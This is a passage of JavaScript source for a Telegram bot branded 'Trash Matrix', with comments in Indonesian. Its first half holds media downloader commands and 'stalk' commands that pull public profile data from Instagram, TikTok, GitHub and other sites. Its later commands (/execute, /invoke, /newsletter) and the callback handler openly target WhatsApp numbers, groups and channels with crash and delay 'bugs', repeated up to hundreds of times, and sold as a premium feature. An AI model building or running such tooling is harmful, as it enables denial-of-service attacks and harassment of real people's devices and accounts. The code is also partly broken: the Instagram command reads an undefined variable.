      return ctx.reply("❌ ☇ Gagal mendapatkan video. Link tidak valid atau error.");
    }

    const videoUrl = res.data.data; 
    
    await ctx.replyWithVideo(
      { url: videoUrl },
      { caption: "✅ ☇ Video berhasil diunduh dari videy.co!" }
    );

  } catch (err) {
    console.error("VideyDL error:", err.message || err);
    ctx.reply("❌ ☇ Terjadi kesalahan saat memproses video.");
  }
});

// -------------------- ( Command : Instagram Stalk ) -------------------- \\

bot.command("instagramstalk", async (ctx) => {
  try {
    const input = ctx.message.text.split(" ")[1];

    if (!input) {
      return ctx.reply(
        "🪧 ☇ Format: /instagramstalk vinzexect"
      );
    }

  const response = await axios.post(
  "https://api.siputzx.my.id/api/stalk/instagram",
  { username: input },
  {
    headers: {
      "Content-Type": "application/json",
      "Accept": "*/*",
      "User-Agent": "Mozilla/5.0"
    }
  }
);

    const data = res.data;

    if (!data.status || !data.data) {
      return ctx.reply("❌ Data tidak ditemukan atau username salah.");
    }

    const ig = data.data;

    const msgText = `
📸 *Instagram Profile Info*

👤 Username: ${ig.username}
👑 Full Name: ${ig.full_name}
📝 Biography: ${ig.biography || '-'}
🔗 External URL: ${ig.external_url || '-'}
📊 Followers: ${ig.followers_count.toLocaleString()}
👥 Following: ${ig.following_count.toLocaleString()}
📬 Posts: ${ig.posts_count.toLocaleString()}
🔒 Private: ${ig.is_private ? 'Yes' : 'No'}
✔️ Verified: ${ig.is_verified ? 'Yes' : 'No'}
🏢 Business Account: ${ig.is_business_account ? 'Yes' : 'No'}
`.trim();

    await ctx.replyWithPhoto(
      { url: ig.profile_pic_url },
      {
        caption: msgText,
        parse_mode: "Markdown",
      }
    );

  } catch (err) {
    console.error("InstagramStalk error:", err);
    ctx.reply("❌ Terjadi kesalahan saat mengambil data Instagram.");
  }
});

// -------------------- ( Command : MLBB Stalk ) -------------------- \\

bot.command('mlbbstalk', async (ctx) => {
  const text = ctx.message.text;
  const input = text.replace('/mlbbstalk', '').trim();

  if (!input || !input.includes('|')) {
    return ctx.reply('🪧 ☇ Format: /mlbbstalk 106101371|2540');
  }

  const [userId, zoneId] = input.split('|').map(v => v.trim());

  if (!userId || !zoneId) {
    return ctx.reply('🪧 ☇ Format: /mlbbstalk userId|zoneId');
  }

  try {
    const response = await axios.get('https://fastrestapis.fasturl.cloud/stalk/mlbb', {
      params: { userId, zoneId },
      headers: {
        'accept': 'application/json'
      }
    });

    const res = response.data;

    if (res.status !== 200) {
      return ctx.reply(`❌ ${res.content || 'Terjadi kesalahan.'}`);
    }

    const { username, region, level, rank } = res.result;

    const message = `
✨ *MLBB Stalker Result*

👤 *Username:* ${username}
🌍 *Region:* ${region}
📈 *Level:* ${level || 'N/A'}
🏆 *Rank:* ${rank || 'N/A'}
`.trim();

    ctx.reply(message, { parse_mode: 'Markdown' });

  } catch (err) {
    if (err.response && err.response.data) {
      const res = err.response.data;
      return ctx.reply(`❌ ${res.content || 'Terjadi kesalahan'}\n🛠 ${res.error || 'Unknown error'}`);
    } else {
      console.error(err);
      return ctx.reply('❌ Terjadi kesalahan internal saat menghubungi API.');
    }
  }
});

// -------------------- ( Command : Pinterest Stalk ) -------------------- \\

  bot.command("pintereststalk", async (ctx) => {
    const query = ctx.message.text.split(" ").slice(1).join(" ");
    if (!query)
      return ctx.reply(
        "🪧 ☇ Format: /pintereststalk vinzexect",
        { parse_mode: "Markdown" }
      );

    await ctx.reply("🔍 Mencari informasi profil...");

    try {
      const res = await axios.post("https://api.siputzx.my.id/api/stalk/pinterest", { q: query });
      const result = res.data.result;

      const caption = `
📌 *Pinterest Stalker*

👤 *Username:* ${result.username}
📛 *Nama Lengkap:* ${result.full_name || "-"}
📍 *Bio:* ${result.bio || "-"}
📊 *Statistik:*
   • Pins: ${result.stats?.pins ?? 0}
   • Followers: ${result.stats?.followers ?? 0}
   • Following: ${result.stats?.following ?? 0}
   • Boards: ${result.stats?.boards ?? 0}
🔗 *Link:* [Klik di sini](${result.profile_url})
      `.trim();

      await ctx.replyWithPhoto(result.image?.original, {
        caption,
        parse_mode: "Markdown",
      });
    } catch (err) {
      console.error(err);
      ctx.reply("❌ Gagal mengambil data Pinterest.");
    }
  });
  
// -------------------- ( Command : Thread Stalk ) -------------------- \\

  bot.command("threadsstalk", async (ctx) => {
    const query = ctx.message.text.split(" ").slice(1).join(" ");
    if (!query) return ctx.reply("🪧 ☇ Format: /threadsstalk vinzexect");

    await ctx.reply("🔍 Sedang mencari profil Threads...");

    try {
      const res = await axios.post("https://api.siputzx.my.id/api/stalk/threads", { q: query });
      const data = res.data?.data;
      if (!data) return ctx.reply("❌ Tidak ditemukan!");

      const caption = `
👤 *${data.name}* [@${data.username}]
${data.is_verified ? "✅ Terverifikasi" : ""}
🆔 ID: \`${data.id}\`
📝 Bio: ${data.bio || "-"}
👥 Followers: ${data.followers?.toLocaleString() || 0}
🔗 Link: ${data.links?.[0] || "-"}
      `.trim();

      await ctx.replyWithPhoto(data.hd_profile_picture, {
        caption,
        parse_mode: "Markdown",
      });
    } catch (err) {
      console.error(err);
      ctx.reply("❌ Gagal mengambil data Threads.");
    }
  });
  
// -------------------- ( Command : Tiktok Stalk ) -------------------- \\

  bot.command("tiktokstalk", async (ctx) => {
    const username = ctx.message.text.split(" ")[1];
    if (!username) return ctx.reply("🪧 ☇ Format: /tiktokstalk vinzexect");

    try {
      const { data } = await axios.post("https://api.siputzx.my.id/api/stalk/tiktok", { username });
      if (!data.status) return ctx.reply("❌ Gagal mengambil data TikTok.");

      const user = data.data.user;
      const stats = data.data.stats;

      const caption = `
👤 *${user.nickname}* (@${user.uniqueId})
🆔 ID: \`${user.id}\`
✅ Verified: ${user.verified ? "Yes" : "No"}
📍 Region: ${user.region}
📝 Bio: ${user.signature || "-"}
📆 Dibuat: ${new Date(user.createTime * 1000).toLocaleDateString("id-ID")}

📊 *Statistik TikTok*
👥 Followers: ${stats.followerCount.toLocaleString()}
👣 Following: ${stats.followingCount.toLocaleString()}
❤️ Likes: ${stats.heart.toLocaleString()}
🎞️ Video: ${stats.videoCount.toLocaleString()}
👫 Friends: ${stats.friendCount.toLocaleString()}
      `.trim();

      await ctx.replyWithPhoto(user.avatarLarger, {
        caption,
        parse_mode: "Markdown",
      });
    } catch (err) {
      console.error(err);
      ctx.reply("🚫 Terjadi kesalahan saat mengambil data TikTok.");
    }
  });
  
// -------------------- ( Command : Twitter Stalk ) -------------------- \\

  bot.command("twitterstalk", async (ctx) => {
    const username = ctx.message.text.split(" ")[1];
    if (!username)
      return ctx.reply("🪧 ☇ Format: /twitterstalk vinzexect");

    try {
      const { data } = await axios.post("https://api.siputzx.my.id/api/stalk/twitter", {
        user: username,
      });
      if (!data.status) return ctx.reply("❌ Gagal mengambil data Twitter.");

      const user = data.data;
      const caption = `
🐦 *${user.name}* (@${user.username})
🆔 ID: \`${user.id}\`
✅ Verified: ${user.verified ? "Yes" : "No"}
📍 Lokasi: ${user.location || "-"}
📅 Bergabung: ${new Date(user.created_at).toLocaleDateString("id-ID")}
📝 Bio: ${user.description || "-"}

📊 *Statistik*
🧵 Tweets: ${user.stats.tweets}
👥 Followers: ${user.stats.followers}
👣 Following: ${user.stats.following}
❤️ Likes: ${user.stats.likes}
🖼️ Media: ${user.stats.media}
      `.trim();

      await ctx.replyWithPhoto(user.profile.image, {
        caption,
        parse_mode: "Markdown",
      });
    } catch (err) {
      console.error(err);
      ctx.reply("🚫 Gagal mengambil data Twitter.");
    }
  });
  
// -------------------- ( Command : Youtube Stalk ) -------------------- \\

  bot.command("youtubestalk", async (ctx) => {
    const username = ctx.message.text.split(" ")[1];
    if (!username)
      return ctx.reply("🪧 ☇ Format: /youtubestalk vinzexect");

    try {
      const { data } = await axios.post("https://api.siputzx.my.id/api/stalk/youtube", { username });
      if (!data.status) return ctx.reply("❌ Gagal mengambil data YouTube.");

      const ch = data.data.channel;
      const videos = data.data.latest_videos;

      const caption = `
📺 *YouTube Channel Info*
👤 Username: ${ch.username}
📌 Subscriber: ${ch.subscriberCount}
🎞️ Total Video: ${ch.videoCount}
📝 Deskripsi: ${ch.description || "-"}
🔗 [Kunjungi Channel](${ch.channelUrl})
      `.trim();

      await ctx.replyWithPhoto(ch.avatarUrl, {
        caption,
        parse_mode: "Markdown",
      });

      for (let video of videos.slice(0, 3)) {
        await ctx.replyWithPhoto(video.thumbnail, {
          caption: `
🎬 *${video.title}*
🕒 ${video.publishedTime} | ⏱️ ${video.duration}
👁️ ${video.viewCount}
🔗 [Tonton Video](${video.videoUrl})
          `.trim(),
          parse_mode: "Markdown",
        });
      }
    } catch (err) {
      console.error(err);
      ctx.reply("🚫 Gagal mengambil data YouTube.");
    }
  });
  
// -------------------- ( Command : Free Fire Stalk ) -------------------- \\

  bot.command("ffstalk", async (ctx) => {
    const id = ctx.message.text.split(" ")[1];
    if (!id)
      return ctx.reply("🪧 ☇ Format: /ffstalk 123456789");

    const proses = await ctx.reply("🔍 Lagi cari data FF-nya, sabar bre...");

    try {
      const { data } = await axios.get(`https://ff.lxonfire.workers.dev/?id=${id}`);
      if (!data || !data.nickname) return ctx.reply("❌ Gagal menemukan data untuk ID tersebut.");

      const caption = `
👤 <b>Nickname:</b> <code>${data.nickname}</code>
🌍 <b>Region:</b> <code>${data.region}</code>
🆔 <b>OpenID:</b> <code>${data.open_id}</code>
      `.trim();

      const imgUrl = data.img_url;
      const fileName = `ff_${Date.now()}.jpg`;
      const filePath = path.join(__dirname, fileName);

      const writer = fs.createWriteStream(filePath);
      https.get(imgUrl, (res) => {
        res.pipe(writer);
        writer.on("finish", async () => {
          await ctx.replyWithPhoto({ source: filePath }, { caption, parse_mode: "HTML" });
          fs.unlinkSync(filePath);
        });
      });

      await ctx.deleteMessage(proses.message_id);
    } catch (err) {
      console.error(err);
      ctx.reply("❌ Terjadi error saat mengambil data FF.");
    }
  });
  
// -------------------- ( Command : Github Stalk ) -------------------- \\

  bot.command("githubstalk", async (ctx) => {
    const input = ctx.message.text.split(" ")[1];
    if (!input) return ctx.reply("🪧 ☇ Format: /githubstalk <username>");

    try {
      const response = await axios.post(
        "https://api.siputzx.my.id/api/stalk/github",
        { user: input },
        { headers: { "Content-Type": "application/json" } }
      );

      const data = response.data;
      if (!data.status) return ctx.reply("❌ User tidak ditemukan atau API error.");

      const profile = data.data;

      const replyText = `
<b>GitHub Profile Info:</b>

👤 <b>Username:</b> ${profile.username}
📝 <b>Nickname:</b> ${profile.nickname || "N/A"}
📄 <b>Bio:</b> ${profile.bio || "N/A"}
🏢 <b>Company:</b> ${profile.company || "N/A"}
🔗 <b>Blog:</b> ${profile.blog || "N/A"}
📍 <b>Location:</b> ${profile.location || "N/A"}
📧 <b>Email:</b> ${profile.email || "N/A"}
📦 <b>Public Repos:</b> ${profile.public_repo}
📝 <b>Public Gists:</b> ${profile.public_gists}
👥 <b>Followers:</b> ${profile.followers}
👣 <b>Following:</b> ${profile.following}
🆔 <b>ID:</b> ${profile.id}
📅 <b>Created at:</b> ${new Date(profile.created_at).toLocaleDateString()}
🔗 <b>URL:</b> <a href="${profile.url}">${profile.url}</a>
      `.trim();

      await ctx.replyWithPhoto(profile.profile_pic, {
        caption: replyText,
        parse_mode: "HTML",
      });
    } catch (error) {
      console.error(error);
      ctx.reply("❌ Error saat mengambil data GitHub.");
    }
  });

// -------------------- ( Command : Facebook Download ) -------------------- \\

bot.command("facebookdl", checkPremium, async (ctx) => {
  const url = ctx.message.text.split(" ")[1];
  if (!url) return ctx.reply("🪧 ☇ Format: /facebookdl <url>");
  try {
    await ctx.reply("⏳ ☇ Proccess..");
    const apiUrl = `https://joozxdev.my.id/api/facebook?url=${encodeURIComponent(url)}`;
    const { data } = await axios.get(apiUrl);
    if (!data.success) return ctx.reply("Gagal mengambil video Facebook.");
    const videoHd = data.video_hd;
    const videoSd = data.video_sd;
    if (videoHd) {
      await ctx.replyWithVideo({ url: videoHd }, { caption: "Facebook Video (HD)" });
    } else if (videoSd) {
      await ctx.replyWithVideo({ url: videoSd }, { caption: "Facebook Video (SD)" });
    } else {
      return ctx.reply("Video tidak ditemukan.");
    }
  } catch (err) {
    console.error("ERROR /facebookdl:", err.message);
    ctx.reply("Terjadi kesalahan saat memproses link Facebook.");
  }
});

// -------------------- ( Command : Pinterest Download ) -------------------- \\

bot.command("pinterestdl", checkPremium, async (ctx) => {
  const url = ctx.message?.text?.split(" ")[1];
  if (!url) return ctx.reply("🪧 ☇ Format: /pintetestdl <url>");
  try {
    await ctx.reply("⏳ ☇ Proccess..");
    const apiUrl = `https://joozxdev.my.id/api/pinterest?url=${encodeURIComponent(url)}`;
    const { data } = await axios.get(apiUrl);

    console.log("Pinterest API Response:", data);

    if (!data.success || !data.url) {
      return ctx.reply("Gagal mengambil media dari Pinterest.");
    }

    const mediaUrl = data.url;
    if (mediaUrl.endsWith(".mp4")) {
      await ctx.replyWithVideo(mediaUrl, { caption: "Pinterest Video" });
    } else {
      await ctx.replyWithPhoto(mediaUrl, { caption: "Pinterest Image" });
    }
  } catch (err) {
    console.error("ERROR /pinterestdl:", err.message);
    ctx.reply("Terjadi kesalahan saat memproses link Pinterest.");
  }
});

// -------------------- ( Command : newsletter ) -------------------- \\

bot.command("newsletter", checkWhatsAppConnection, checkPremium, checkCooldown, async ctx => {

    const date = getCurrentDate();
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(
      `🪧 ☇ Format: /newsletter 120363×××`
    );

    let target = q.replace(/[^0-9]/g, '') + "@newsletter";

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 1; i++) {
      await VinzChannel(sock, target);
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await ctx.reply(
`<blockquote>「 Trash — Matrix [ 🍁 ] 」</blockquote>

ⵢ. Target : ${q}
ⵢ. Type : Crash Newsletter
ⵢ. Status : Success Send Bug
ⵢ. Waktu : ${date}

<blockquote> © vinzεphyr — Trash Matrix</blockquote>
`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "𖥂 𝑶𝒘𝒏𝒆𝒓 𖥂",
                url: `https://t.me/zellhade`
              }
            ],
            [
              {
                text: "𖥂 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 𖥂",
                url: `https://t.me/vinzxiterr`
              }
            ]
          ] 
        }
      }
    );
});

// -------------------- ( Command : InVoke ) -------------------- \\

bot.command("invoke", checkWhatsAppConnection, checkPremium, checkCooldown, async ctx => {

    const date = getCurrentDate();
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(
      `🪧 ☇ Format: /invoke 120363×××`
    );

    let target = q.replace(/[^0-9]/g, '') + "@g.us";

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 1; i++) {
      await VinzCrash(sock, target);
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await ctx.reply(
`<blockquote>「 Trash — Matrix [ 🍁 ] 」</blockquote>

ⵢ. Target : ${q}
ⵢ. Type : Crash Click Group Infinity
ⵢ. Status : Success Sending Bug
ⵢ. Waktu : ${date}

<blockquote> © vinzεphyr — Trash Matrix</blockquote>
`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "𖥂 𝑶𝒘𝒏𝒆𝒓 𖥂",
                url: `https://t.me/zellhade`
              }
            ],
            [
              {
                text: "𖥂 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 𖥂",
                url: `https://t.me/vinzxiterr`
              }
            ]
          ] 
        }
      }
    );
});

// -------------------- ( Command : Execute ) -------------------- \\

async function prosesrespone(target, ctx, mode) {
    const date = getCurrentDate();

    await ctx.reply(`
<blockquote>「 Trash — Matrix [ 🍁 ] 」</blockquote>

ⵢ. Target : ${target}
ⵢ. Type : ${mode.toUpperCase()}
ⵢ. Status : Proccess Send Bug
ⵢ. Waktu : ${date}

<blockquote> © vinzεphyr — Trash Matrix</blockquote>
`, { 
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕「📱」", url: `https://wa.me/${target}` }
            ]]
        }
    });
}

async function donerespone(target, ctx, mode) {
    const date = getCurrentDate();

    await ctx.reply(`
<blockquote>「 Trash — Matrix [ 🍁 ] 」</blockquote>

ⵢ. Target : ${target}
ⵢ. Type : ${mode.toUpperCase()}
ⵢ. Status : Success Send Bug
ⵢ. Waktu : ${date}

<blockquote> © vinzεphyr — Trash Matrix</blockquote>
`, { 
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕「📱」", url: `https://wa.me/${target}` }
            ]]
        }
    });
}

bot.command("execute", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

    const q = ctx.message.text.split(" ")[1];

    if (!q || !/^\+?\d{5,17}$/.test(q)) {
        return ctx.reply(
            "🪧 ☇ Format: /execute +62×××",
            { parse_mode: "Markdown" }
        );
    }

    let isTarget = q.replace(/[^0-9]/g, '');
    
   const keyboard = {
    inline_keyboard: [
      [
        { text: "⏤͟͟͞𝑪𝒓𝒂𝒔𝒉 𝑰𝒏𝒗𝒊𝒔𝒊𝒃𝒍𝒆 北", callback_data: `invisible_${isTarget}` },
      ],
      [
        { text: "⏤͟͟͞𝑪𝒓𝒂𝒔𝒉 𝑫𝒆𝒍𝒆𝒕𝒆 北", callback_data: `delete_${isTarget}` },
      ],
      [
        { text: "⏤͟͟͞𝑫𝒆𝒍𝒂𝒚 𝑴𝒂𝒌𝒆𝒓 北", callback_data: `delay_${isTarget}` },
      ],
      [
        { text: "⏤͟͟͞𝑪𝒓𝒂𝒔𝒉 𝑰𝒐𝒔 北", callback_data:  `ios_${isTarget}` },
      ],
      [
        { text: "⏤͟͟͞𝑫𝒆𝒍𝒂𝒚 𝑸𝒖𝒐𝒕𝒂 北", callback_data: `dozer_${isTarget}` },
       ],
       [
        { text: "⏤͟͟͞𝑩𝒍𝒂𝒏𝒌 𝑪𝒍𝒊𝒄𝒌 北", callback_data: `blank_${isTarget}` }
      ]
    ]
  };
    
    const MainMenu = await ctx.replyWithPhoto(
        { url: "https://g.top4top.io/p_36315dasl1.jpg" },
        {
            caption: `
<blockquote><pre>空所 ┊ ＴＲＡＳＨ • ＭＡＴＲＩＸ
──────────────────────────────  

Olaaa, I am a telegram bot created by @vinzxiterr  
I can send bug functions that cause WhatsApp to crash, Use me wisely  

⌜ Trash ☇ Execute° Menu ⌟  

⬡ Target: ${isTarget}

─▢ Sellect Button Bug
</pre></blockquote>
`,
            parse_mode: "HTML",
            reply_markup: keyboard
        });
    });

bot.on("callback_query", async (ctx) => {
    try {
    
        const userId = ctx.from.id;        
        const isOwner = userId.toString() === ownerID.toString();        
        const isPrem = isPremiumUser(userId);

        if (!isOwner && !isPrem) {
            return ctx.answerCbQuery("❌ ☇ Akses hanya untuk premium", { show_alert: true });
        }
                
        const data = ctx.callbackQuery.data;
        const [mode, number] = data.split("_");        
        const chatId = ctx.update.callback_query.message.chat.id;
        const msgId = ctx.update.callback_query.message.message_id;
        if (!number) return ctx.answerCbQuery("❌ Invalid Target Data");
        let target = number + "@s.whatsapp.net";
        const date = getCurrentDate();
       
        await ctx.answerCbQuery();

        await prosesrespone(target, ctx, mode);

        console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        if (mode === "invisible") {
            for (let i = 0; i < 50; i++) { 
                await VinzClose(sock, target);
                await sleep(1500); 
            }
        } 
        
        else if (mode === "delete") {
            for (let i = 0; i < 50; i++) {
                await VinzDelete(sock, target);
                await sleep(1500);
            }
        } 
        
        else if (mode === "ios") {
            for (let i = 0; i < 50; i++) { 
                await VinzIos(sock, target);
                await sleep(3000);
                await VinzIos(sock, target);
                await sleep(3000);
            }
        } 
        
        else if (mode === "delay") {
            for (let i = 0; i < 100; i++) {
                await VinzDelay(sock, target);
                await sleep(1000);
                await VinzDelay(sock, target);
                await sleep(1000);
            }
        } 
        
        else if (mode === "dozer") {
            for (let i = 0; i < 500; i++) {
                await VinzDozer(sock, target);
                await sleep(3000);
                await VinzDozer(sock, target);
                await sleep(3000);
            }
        } 
        
        else if (mode === "blank") {
            for (let i = 0; i < 5; i++) {
                await VinzBlank(sock, target);
                await sleep(1500);
                await VinzBlank(sock, target);
                await sleep(1500);
            }
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await donerespone(target, ctx, mode);

    } catch (e) {
        console.log("Error Callback:", e);
        ctx.reply("❌ Terjadi error saat mengirim bug.");
    }
});

// -------------------- ( Bot Launch ) -------------------- \\
bot.launch().then(() => {
    setBotProfile();
}).catch(error => {
    console.error(error);
});